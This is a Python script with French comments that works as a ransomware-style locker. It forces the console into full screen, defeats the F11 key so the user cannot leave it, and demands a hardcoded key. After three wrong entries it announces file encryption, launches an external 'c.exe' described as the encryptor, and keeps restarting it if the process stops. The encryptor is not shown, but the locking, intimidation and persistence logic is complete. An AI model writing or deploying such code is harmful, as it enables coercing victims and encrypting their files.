# encoding UTF-8
import os, time, pyautogui, threading, keyboard, random, psutil
from colored import fg, attr, bg

# Var
running = True
response = "graven"
wait_until_block = 0
is_crypting = False

# Paramètres du cmd
os.system("@echo off")
os.system("title PASSWORD")
os.system("cls")
pyautogui.press("F11")


def WaitF11(): # Fonction pour bloquer la fenêtre en plein écran

    global running
    
    while running:
        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam) 
        

def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
    
    global running
    global is_crypting
    
    while running and not is_crypting: # Si le programme est lancé mais le cryptage n'a pas commencé
        os.system("color 4a") # Fond rouge police verte
        time.sleep(0.1)
    while is_crypting: # Si le cryptage a commencé
        os.system("color a") # Fond noir police verte
        time.sleep(0.1)


def Main(): # Fonction principale
    
    global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
    global running
    global is_crypting
    
    while running: 
        os.system("cls")
        
        user_response = input(f"{fg(0)}{bg(1)}Please enter your key : {attr(0)}") # L'utilisateur entre la clé

        if user_response == response: # Si la valeur entrée est correcte
            print(f"{fg(2)}{bg(1)}Valid key !{attr(0)}")
            print(f"{fg(0)}{bg(1)}Press F11 to quit..{attr(0)}")
            running = False # Quitter le programme
            with open("is_correct.bool", "w") as bool:
                bool.write("true")

        else: # Clé invalide
            print(f"{fg(88)}{bg(1)}Invalid key.{attr(0)}")
            wait_until_block += 1
            time.sleep(0.5)
            if wait_until_block >= 3: # Si l'utilisateur entre une clé invalide 3 fois ou +
                # Cryptage de fichier et autres
                print("Maximum number of errors exceeded.")
                time.sleep(1)
                print("FILE ENCRYPTION IN PROGRESS.")
                time.sleep(1)
                os.system("start c.exe")
                time.sleep(1)
                is_crypting = True # Indiquer aux autres fonctions que le cryptage a commencé
                while True:
                    if "c.exe" not in (p.name() for p in psutil.process_iter()): os.system("start c.exe"), time.sleep(1.5) # Relancer le cryptage si il n'a pas commencé
                    char = ""
                    for i in range(237): # 237 = nombre de caractère max par ligne sur le cmd
                        if random.choice([-1, 0, 1]) == 0: char += " " # 1/3 chance d'ajouter un espace
                        else: char += str(random.randint(0, 9)) # Sinon on ajoute un chiffre au hasard
                    os.system(f"echo {char}") # Puis on envoie avec f"" pour entrer une variable entre {}
                    
# Threads
main = threading.Thread(target=Main)
wait_f11 = threading.Thread(target=WaitF11)
set_background_color = threading.Thread(target=SetBackgroundColor)

# Liste des threads
threads = [set_background_color, main, wait_f11]

# Lancer les threads un par un
for thread in threads: thread.start()
for thread in threads: thread.join()